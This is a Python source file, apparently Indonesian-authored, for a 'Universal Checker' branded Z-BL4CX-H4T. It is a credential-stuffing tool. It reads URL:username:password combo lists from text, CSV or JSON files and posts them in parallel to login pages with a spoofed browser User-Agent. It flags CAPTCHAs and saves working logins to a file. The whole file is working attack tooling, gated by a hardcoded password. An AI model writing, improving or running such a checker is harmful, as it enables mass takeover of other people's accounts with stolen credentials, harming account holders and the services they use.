import requests
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor
import time
import csv
import json
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from getpass import getpass  # Untuk menyembunyikan input password

# Fungsi untuk memverifikasi login
def verify_login(username, password):
    correct_username = "Z-BL4CX-H4T"
    correct_password = "THE Z-BL4CX-H4T"

    if username == correct_username and password == correct_password:
        return True
    else:
        return False

# Fungsi untuk login
def login():
    print(f"{Fore.BLUE}{Style.BRIGHT}")
    print("Please log in to continue.")
    print(Style.RESET_ALL)

    username = input("Username: ").strip()
    password = getpass("Password: ")  # Menyembunyikan input password

    if verify_login(username, password):
        print(f"{Fore.GREEN}Login successful!{Style.RESET_ALL}")
        return True
    else:
        print(f"{Fore.RED}Invalid username or password.{Style.RESET_ALL}")
        return False

# Fungsi untuk mengirim email notifikasi
def send_email(subject, body):
    sender_email = "youremail@example.com"  # Ganti dengan email pengirim
    receiver_email = "receiver@example.com"  # Ganti dengan email penerima
    password = "yourpassword"  # Ganti dengan password email pengirim

    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = receiver_email
    msg["Subject"] = subject

    msg.attach(MIMEText(body, "plain"))

    try:
        server = smtplib.SMTP("smtp.example.com", 587)  # Ganti dengan SMTP server yang sesuai
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.quit()
        print(f"{Fore.GREEN}Notification sent to {receiver_email}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Failed to send email: {e}{Style.RESET_ALL}")

# Fungsi untuk memvalidasi login
def validate_login(url, username, password):
    data = {
        "username": username,
        "password": password
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    try:
        response = requests.post(url, data=data, headers=headers)

        if response.status_code == 200:
            if "success" in response.text.lower():
                return True
            elif "captcha" in response.text.lower():
                print(f"{Fore.YELLOW}CAPTCHA Detected at URL: {url}. Please solve manually.{Style.RESET_ALL}")
                return None
            else:
                return False
        elif response.status_code in [400, 401, 403]:
            return False
    except requests.RequestException as e:
        print(f"{Fore.RED}Error during request: {e}{Style.RESET_ALL}")
    return None

# Fungsi untuk memproses akun
def process_account(account, tested_accounts):
    account = account.strip()

    if account in tested_accounts:
        print(f"{Fore.CYAN}Skipping already tested account: {account}{Style.RESET_ALL}")
        return

    tested_accounts.add(account)

    if account.startswith("https://") and account.count(':') >= 2:
        try:
            url_end_idx = account.find(':', account.find(':') + 1)
            url = account[:url_end_idx]
            credentials = account[url_end_idx + 1:]
            username, password = credentials.split(':', 1)

            result = validate_login(url, username, password)
            if result is True:
                print(f"{Fore.GREEN}Login Successful: |> URL: {url}\n|> Username: {username}\n|> Password: {password}{Style.RESET_ALL}")
                # Menyimpan hasil dengan format yang diminta
                with open("sukses_login.txt", "a") as success_file:
                    success_file.write(f"|> URL: {url}\n|> Username: {username}\n|> Password: {password}\n\n")
            elif result is False:
                print(f"{Fore.LIGHTBLUE_EX}Login Failed: |> URL: {url}\n|> Username: {username}\n|> Password: {password}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}Error while processing account: |> URL: {url}\n|> Username: {username}\n|> Password: {password}{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}Invalid Format: {account}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Invalid Format: {account}{Style.RESET_ALL}")

# Fungsi utama
def main():
    # Login terlebih dahulu
    if not login():
        return  # Jika login gagal, keluar dari program

    print(f"{Fore.BLUE}{Style.BRIGHT}")
    print("""\033[1;36m
                                         Universal Checker
                                           .-=++*****++=-.
                                       -*%%@@@@@@%*==::-=*##+:
                                    -##=:.#@@@@@@*+:#@#*-   .=**:
                                  =*=    #@@@@@@@@@@@@%:        -+=
                                :*:    .%@@@@@@@@@@@@+            .=:
                               --      .@@@@@@@@@@@#:               .-
                              :         *#@@@+:.  .+                  :
                             .          . %@@   -  ..:                 .
                                          .=+=:=-      -
  ---   ---   :--    --.   :--.  ---   .--.  -------:   -------.     :===-:.     .--:      ---
  @@*   %@*   -@@@=  #@    =@@.  -@@-  +@*   %@%=====   +@@==+@@-   %@%==+#:     #@@@:     *@%
  @@*   %@*   -@#%@%-%@    =@@.   =@@:=@#    %@@###.    +@@==*@%:   -%@@#*-     #@--@@:    *@%
  %@#  .%@*   -@+ -%@@@    =@@.    =@@@#     %@#...     +@@-*@@:    =:.:=@@*   #@@**@@@:   *@%
  :#%@@@%+.   =%+   +%%    =%%.     +%#      #%%%%%%+   +%%  +%%-   ##%@@@#:  +%*....*%#.  *%%%%%%+

                                                      -#@@@@@@@@@@:
                             .                         .@@@@@@@%*-     .
                              :                        =@@@@@@=       :
                               -:                      @@@@#=       .-
                                :+.                   %@*=.       .=:
                                  =*-                :%:        :+=
                                    -**=.                   .-++:
                                       -*##+=-:.     .:-=+##+-
                                           :-=+**###**+=-:
""")
    print(Style.RESET_ALL)

    file_name = input("Enter File Name (.txt, .csv, .json): ").strip()
    tested_accounts = set()

    try:
        if file_name.endswith('.txt'):
            with open(file_name, 'r') as file:
                accounts = file.readlines()
        elif file_name.endswith('.csv'):
            with open(file_name, 'r') as file:
                reader = csv.reader(file)
                accounts = [f"{row[0]}:{row[1]}:{row[2]}" for row in reader]  # Asumsi format CSV: URL, Username, Password
        elif file_name.endswith('.json'):
            with open(file_name, 'r') as file:
                accounts = json.load(file)
                accounts = [f"{account['url']}:{account['username']}:{account['password']}" for account in accounts]
        else:
            print(f"{Fore.RED}Unsupported file format!{Style.RESET_ALL}")
            return

        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(lambda account: process_account(account, tested_accounts), accounts)

    except FileNotFoundError:
        print(f"{Fore.RED}File {file_name} not found.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
    
    # Kirim notifikasi setelah proses selesai
    send_email("Universal Checker Results", "The login checks have been completed.")

if __name__ == "__main__":
    from colorama import init
    init(autoreset=True)
    main()
